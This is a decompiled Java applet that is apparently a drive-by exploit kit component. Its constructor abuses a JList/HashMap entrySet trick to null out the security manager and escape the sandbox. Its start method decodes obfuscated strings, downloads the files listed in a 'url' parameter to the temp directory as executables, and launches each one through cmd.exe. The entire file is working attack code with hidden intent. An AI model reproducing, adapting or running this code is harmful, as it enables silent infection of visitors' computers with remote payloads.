import java.net.URL;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class sob extends Applet
{
    @Override
    public void start() {
        super.start();
        try {
            final int[] array = { 86, 81, 79 };
            final int[] array2 = { 73, 66, 85, 66, 13, 74, 76, 13, 87, 78, 83, 71, 74, 81 };
            final String[] split = this.getParameter(bolshe(array)).split("@");
            final String property = System.getProperty(bolshe(array2));
            Integer n;
            for (n = 0; n < split.length && split[n].length() != 0; ++n) {
                final String string = property + ("ms" + n + "rcOfOgN3O2d.reNxEer".replaceAll("[O6EmdNkrj]", ""));
                final InputStream wud = this.wud(split[n]);
                final FileOutputStream fileOutputStream = new FileOutputStream(string);
                final byte[] array3 = new byte[1024];
                int read;
                while ((read = wud.read(array3, 0, array3.length)) != -1) {
                    fileOutputStream.write(array3, 0, read);
                }
                wud.close();
                fileOutputStream.close();
                Runtime.getRuntime().exec(new StringBuilder().append("gcgmbdg.Oe9xOeb l/bcl ls9twa9rAt g").toString().replaceAll("[bz9AEwlOg]", "") + string);
            }
            this.wud(split[n - 1] + ";1").close();
        }
        catch (Exception ex) {}
    }
    
    public sob() {
        final v567345 v567345 = new v567345(System.class, "setSecurityManager", new Object[] { null });
        final HashSet<v567345> set = new HashSet<v567345>();
        set.add(v567345);
        this.add(new JList<Object>(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return set;
                }
            } }));
    }
    
    public InputStream wud(final String s) {
        try {
            final URL url = new URL(s);
            url.openConnection();
            return url.openStream();
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    static String bolshe(final int[] array) {
        final byte b = (byte)Math.ceil(34.33);
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            array[i] ^= b;
            sb.append((char)array[i]);
        }
        return sb.toString();
    }
}
